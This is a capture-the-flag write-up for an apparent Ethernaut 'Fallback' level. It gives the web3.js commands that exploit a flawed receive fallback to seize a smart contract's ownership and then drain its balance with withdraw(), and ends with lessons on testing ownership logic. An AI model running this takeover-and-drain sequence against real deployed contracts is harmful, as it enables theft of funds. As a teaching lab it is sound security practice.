# Fallback

# Problem Statement
```
Look carefully at the contract's code below.

You will beat this level if
- you claim ownership of the contract
- you reduce its balance to 0

Things that might help
- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods
```

# Solution

## Part 1: Claim ownership of the contract
Reading the contract, this can be accomplished by calling the `contribute` function to put our address into the `contributions` mapping.
After that, we can call the `receive` fallback function to set our address as the `owner`.

Call the `contribute` function:
```
let sig = web3.eth.abi.encodeFunctionSignature("contribute()")
let ethValue = web3.utils.toWei('0.0000001', 'ether') // this amount of ether should allow us to pass the require check
await web3.eth.sendTransaction({
  to: contract.address,
  from: player,
  data: sig,
  value: ethValue
})
```

Call the `receive` function:
```
ethValue = web3.utils.toWei('0.0000000001', 'ether') // we need to send ether for our call to reach the contract's receive fallback
await web3.eth.sendTransaction({to: contract.address, from:player, value: ethValue})
await contract.owner() // note here you are now the owner
```

## Part 2: Reduce contract balance to 0
When part 1 is completed, we can call the `withdraw` function to complete this part.

Call the `withdraw` function:
```
let sig = web3.eth.abi.encodeFunctionSignature("withdraw()")
await web3.eth.sendTransaction({to: contract.address, from:player, data:sig})
```

We've completed this lesson!

# Key Learnings
- When implementing fallback methods, double-check the logic and add unit tests.
- When setting ownership, double-check the logic and add unit tests.
